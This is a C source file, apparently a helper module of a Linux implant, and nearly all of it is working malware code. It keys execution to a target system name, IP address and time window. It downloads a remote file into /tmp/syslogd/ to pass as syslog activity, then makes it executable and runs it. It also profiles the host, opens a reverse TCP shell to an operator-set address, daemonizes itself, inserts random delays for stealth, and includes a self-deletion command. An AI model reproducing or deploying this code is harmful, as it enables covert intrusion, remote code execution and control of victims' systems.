/*  File: valHelper.c
*   Author: Nunyabeeswax
*   Date: 6/7/2021
*   Description:
*               - Defines the auxilliary functions declared in valHelper.h
*/

#include "valHelper.h"

/* ======== Validating ======= */

void val_SysName(){
    #ifdef VALID_SYSNAME
    struct utsname uts;
    uname(&uts);
    if (strcmp(uts.sysname, VALID_SYSNAME)==0) return;
    else{
        #ifdef DEBUG
            printf("NOT Target System");
        #endif
        exit(EXIT_FAILURE);
    }
    #endif
}

void val_IP(){
    #ifdef VALID_IP
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];

    if (getifaddrs(&ifaddr) == -1){
        my_perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    // ifaddr might be a list of interfaces
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next){
        // don't do loop if addr null
        if (ifa->ifa_addr == NULL)
            continue;
        // translate the socket address into a location and service name into the host param
        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);
        if((ifa->ifa_addr->sa_family==AF_INET)){ 
            if (s != 0){
                #ifdef DEBUG
                    printf("getnameinfo() failed: %s\n", gai_strerror(s));
                #endif
                exit(EXIT_FAILURE);
            }

            #ifdef DEBUG
                printf("Interface : <%s>\n",ifa->ifa_name );
                printf("Address : <%s>\n", host);
            #endif

            // clear up the mem used by getifaddrs
            freeifaddrs(ifaddr);

            // this the one!
            if (strcmp(host, VALID_IP)==0){
                return;
            }
            // wrong IP!
            else{
                my_perror("Wrong IP!");
                exit(EXIT_FAILURE);
            }
        }
    }
    my_perror("Interface not part of AF_INET Family!");
    exit(EXIT_FAILURE);
    #endif
}


// date struct for val_time
struct date {
 int dd, mm, yy;
};


/* compare given dates. Return 0 if they're equal.
Return 1 if d1 is later than d2. Return -1 if d1 is earlier.*/
int date_cmp(struct date d1, struct date d2) {
 if (d1.dd == d2.dd && d1.mm == d2.mm && d1.yy ==d2.yy)
    return 0;
 else if (d1.yy > d2.yy || d1.yy == d2.yy && d1.mm > d2.mm || 
           d1.yy == d2.yy && d1.mm == d2.mm && d1.dd > d2.dd)
    return 1;
 else return -1;
};


/* print a given date */
 void date_print(struct date d) {
    printf("%02d/%02d/%d\n", d.mm, d.dd, d.yy);
};


void val_time(){
    #ifdef VALID_TIME
    time_t now;
 
    // Obtain current time
    time(&now);
    struct tm *local = localtime(&now);
         
    // get current date
    struct date date_cur = {local->tm_mday, local->tm_mon + 1, local->tm_year + 1900};
    date_print(date_cur);

    char* token;

    // ==== START_DATE PARSING ===
    char start_date[] = {START_DATE};
    char start_month[3];
    char start_day[3];
    char start_year[5];

    token = strtok(start_date, "/");
    memcpy(start_month, token, 2);
    token = strtok(NULL, "/");
    memcpy(start_day, token, 2);
    token = strtok(NULL, "/");
    memcpy(start_year, token, 4);

    struct date date_start = {atoi(start_day), atoi(start_month), atoi(start_year)};
    date_print(date_start);

    // === END_DATE PARSING ===
    token = NULL;
    char end_date[] = {END_DATE};
    char end_month[3];
    char end_day[3];
    char end_year[5];

    token = strtok(end_date, "/");
    memcpy(end_month, token, 2);
    token = strtok(NULL, "/");
    memcpy(end_day, token, 2);
    token = strtok(NULL, "/");
    memcpy(end_year, token, 4);

    struct date date_end = {atoi(end_day), atoi(end_month), atoi(end_year)};
    date_print(date_end);

   /* ===== Checking the Dates =====*/

   int cmp_cur_strt = date_cmp(date_cur, date_start);
   int cmp_cur_end = date_cmp(date_cur, date_end);

    // date >= start_date
    if(cmp_cur_strt == 1 || cmp_cur_strt == 0){
        // date <= end_date
        if(cmp_cur_end == -1 || cmp_cur_end == 0)
            ;// Within dates, move on to check TIME
        // date > end_date
        else{
            //uninstall (should be called in main anyway) and exit
            #ifdef DEBUG
                printf("Past end date. Exiting!");
            #endif
            exit(EXIT_FAILURE);
        }
    }
    // date < start_date
    else{
        // sleep 24 hrs, then checkDate again
        #ifdef DEBUG
            printf("Before start date. Sleeping 24 hrs\n");
        #endif
        sleep(86400);
        val_time();
        return;
    }

    /*
    time >= WORK_START --> check end_time
        time < end_time --> execute
        time >= end_time --> sleep till next day
            call date check again
    */
    int cur_hr = local->tm_hour;

    // after start of work day
    if( cur_hr >= WORK_START){
        // perfect timing!
        if(cur_hr < WORK_END){
            return;
        }
        //sleep 12 hrs till next day
        else{
            #ifdef DEBUG
            printf("After work day. Sleeping 12 hrs\n");
            #endif
            sleep(43200);
            val_time();
            return;
        }
    }
    // before workday
    else{
        // sleep 4 hrs then check again
        #ifdef DEBUG
            printf("Before workday. Sleeping 4 hrs\n");
        #endif
        sleep(14400);
        val_time();
        return;
    }
    #endif
}


int dwnldAndExecFile(char* url){
    // download the file to /tmp/syslogd/ to masquerade as syslog daemon activity. Can use -e <cmd> to execute the command after download.
    // after debug set wait to 1m
    char baseCmd[] = {"wget --tries=10 --no-clobber --no-cookies --no-use-server-timestamps --limit-rate=20k --wait=15 \
    --random-wait --restrict-file-names=unix -q --no-dns-cache -P /tmp/syslogd/ "};

    strcat(baseCmd,url);
    char* buf = NULL;

    #ifdef DEBUG
        printf("Downloading. Could take some time.\n");
    #endif

    if( execCommand(baseCmd, &buf, 0,0) != -1){
        #ifdef DEBUG
            printf("Sucessfully downloaded to /tmp/syslogd/\n");
        #endif

        // =========  Get Path =========

        char* filePath = (char*) malloc(100);
        strcpy(filePath, "/tmp/syslogd/");
        DIR *dr;
        struct dirent *en;
        dr = opendir("/tmp/syslogd/");
        if (dr) {
            //relies on the downloaded file being the only file in the dir (because we barely made it in wget())
            while ((en = readdir(dr)) != NULL) {
                //puts(en->d_name); //for troubleshooting

                int isDot = strcmp(".", en->d_name);
                int isDouble = strcmp("..", en->d_name);

                // don't get the current or back directory
                if( (isDot != 0) && (isDouble != 0) ){
                    strcat(filePath,en->d_name);
                }
            }
            closedir(dr);
        }
        sleep(getRandom());

        // =========  chmod =========   
        if( chmod(filePath,S_IXUSR) == -1 ){ // give owner execute priv >:]
            return my_perror("Error: chmod()");
        }
        sleep(getRandom());

        // =========  running =========
        if( execCommand(filePath, &buf, 0,0) == -1){ //forking
            return my_perror("Error: Executing the downloaded file");
        }
        #ifdef DEBUG
            printf("Successful Download and Execution!\n");
        #endif
        free(filePath);
        return 0;
    } else{
        return my_perror("Downloading Erorr");
    }
}


/*======== Profiling ======= 
    NOT IMPLEMENTED 
    /resources/misc/profilerDemo.c
    https://stackoverflow.com/questions/4757512/execute-a-linux-command-in-the-c-program
*/

struct Profile* getProfile(){
    struct utsname uts;
    uname(&uts);

    struct Profile* outProf = (struct Profile*) malloc(sizeof(struct Profile));

    outProf->kernel = uts.sysname;
    outProf->kernel_v = uts.version;
    outProf->kernel_rel = uts.release;
    outProf->hardware = uts.machine;
    /// Continue implementing later
}

char* strProfile(){
    struct utsname uts;
    uname(&uts);
    char * giantList = malloc(1024);
    strcat(giantList,uts.sysname);
    strcat(giantList,"\n");

    strcat(giantList,uts.machine);
    strcat(giantList,"\n");

    strcat(giantList,uts.release);
    strcat(giantList,"\n");

    strcat(giantList,uts.version);
    strcat(giantList,"\n");

    FILE *fp;
    char path[1035];

    // (UID or group ID) of ppl in sys
    fp = popen("id", "r");
    fgets(path, sizeof(path), fp);
    strcat(giantList, path);
    //strcat(giantList,"\n");

    //Linux command line utility that is used in case a user wants to know the shared library dependencies of an executable or shared library
    fp = popen("ldd --version", "r");
    fgets(path, sizeof(path), fp); 
    strcat(giantList, path);
    //strcat(giantList,"\n");

    // used to query and change the system locale and keyboard layout settings.
    fp = popen("localectl status", "r");
    fgets(path, sizeof(path), fp);
    strcat(giantList, path);
    //strcat(giantList,"\n");

    /* close */
    pclose(fp);
    return giantList;
}


/*===== General Functions =====*/

void uninstallProg(char* prog){
    int i = unlink(prog);
    #ifdef DEBUG
        if(i == 0)
            printf("Validator Unlink success!\n", i);
        else printf("Failed to unlink.\n");
    #endif
    return;
}

int execCommand(char* command, char** buff, int read, int forkk){
    FILE* pf;
    
    #ifdef DEBUG
        if(read == 1){
            printf("IN execCommand()\tCommand: '%s'\n", command);
        }
    #endif

    if(forkk == 1){
        int pid = fork();

        switch (pid) {
            case -1: 
                return my_perror("Fork Failed");
            case 0: // child process
                break;
            default: // parent process returns while child executes the rest (zombie)
                return 0;
        }
    }

    // popen
    pf = popen(command, "r");
    if(pf == NULL){
        my_perror("Error popen()");
        return -1;
    }
    else if(read == 0){ // don't read output.
        // being sneaky
        sleep(getRandom());

        #ifdef DEBUG
            printf("IN execCommand()\tNot reading.\n");
        #endif

        if( pclose(pf) ==-1)
            return -1;
        else
            return 0;
    }
    // reading
    else{
        char buf[252];
        char* str = NULL;
        char* temp = NULL;
        unsigned int size = 1;  // start with size of 1 to make room for null terminator
        unsigned int strlength;


        // being sneaky
        sleep(getRandom());
        
        #ifdef DEBUG
            printf("IN execCommand()\tReading...\n");
        #endif
        // copy whole thing into data buffer
        while( fgets(buf, sizeof(buf), pf) != NULL){
            strlength = strlen(buf);
            temp = realloc(str, size + strlength);  // allocate room for the buf that gets appended
            if (temp == NULL) {
                my_perror("Error realloc()");
            } else {
            str = temp;
            }
            strcpy(str + size - 1, buf);     // append buffer to str
            size += strlength; 
        }
        
        if( pclose(pf) ==-1)
            return -1;

        // set the values through reference
        (*buff) = str;
        #ifdef DEBUG
            printf("IN execCommand()\tCommand successfully ran!\n");
        #endif
        return 0;
    }
}

void printCmdResults(char* command){
    char* buf = NULL;
    if(execCommand(command, &buf, 1,0)){
        #ifdef DEBUG
            fputs("*Command Failed*\n",stderr);
        #endif
    }
    else{
        #ifdef DEBUG
            printf("======= %s result =======\n%s---------------------\n",command, buf);
        #endif
    }
    free(buf);
}

int my_perror(char* msg){
    #ifdef DEBUG
        perror(msg);
    #endif
    return EXIT_FAILURE;
}

int getRandom(){
    #ifdef SLEEP
        int slptime;
        sscanf(SLEEP,"%d", &slptime);
    #else
        int slptime = rand() % 6 + 1;
    #endif
    return slptime;
}

int revTCPShell(){

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;

	int prt;
	#ifdef REV_SHELL_PORT
		sscanf(REV_SHELL_PORT,"%d", &prt);
	#endif

    // convert the unsigned short integer <port> from host byte order to network byte order.
    addr.sin_port = htons(prt);

	#ifdef REV_SHELL_IP
    // converts the Internet host address <IP> from the IPv4 numbers-and-dots notation into network byte order
    // stores it in the structure that <sin_addr> points to.
    inet_aton(REV_SHELL_IP, &addr.sin_addr);
	#endif

	#ifdef DEBUG
		printf("Reverse IP: '%s'\tReverse Port: '%s'\n",REV_SHELL_IP, REV_SHELL_PORT);
	#endif

    // open a socket stream using IPv4 and automatically assigned protocol
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    // actually connect the file descriptor to the IP address
    if( connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1){
        return my_perror("Error: revTCPShell socket connection");
    }

    // map std in,out,err to the socket using macros for portability
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDERR_FILENO); 
    dup2(sockfd, STDOUT_FILENO);

    // will go to the operator
    printf("Use $uninstall to unlink the executable.");
    
    // make an evironment variable that finds the validator executable and deletes it
	char* env_vars[] = {"uninstall=find ~ -type f -name 'validator.out' -exec rm -f {} \\;", NULL};
    
    //start shell w no arg vector and new local environment variable
    execve("/bin/sh", NULL, env_vars);
}

void daemonize(){
    /* Our process ID and Session ID */
	pid_t pid, sid;
	
	/* Fork off the parent process.
	Inherently leaves zombies because parent process shouldn't wait for daemon child */
	pid = fork();
	if (pid < 0) {
		exit(EXIT_FAILURE);
	}
	/* If we got a good PID, then we can exit the parent process. */
	if (pid > 0) {

		exit(EXIT_SUCCESS);
	}

	/* Change the file mode mask */
	umask(0);
			
	/* Open any logs here. None for now */        
			
	/* Create a new SID for the child process */
	sid = setsid();
	if (sid < 0) {
		/* Log the failure */
		exit(EXIT_FAILURE);
	}
	
	/* Change the current working directory */
	if ((chdir("/")) < 0) {
		/* Log the failure. None for now*/
		exit(EXIT_FAILURE);
	}
	
	/* Close out the standard file descriptors if not in debug mode
	#ifndef DEBUG
		close(STDIN_FILENO);
		close(STDOUT_FILENO);
		close(STDERR_FILENO);
	#endif
    // if these are closed, reverse shell doesn't work */

	/* Daemon-specific initialization goes here. None for now. */
	
	// since the loop is in the main, I will just return.
	return;
}
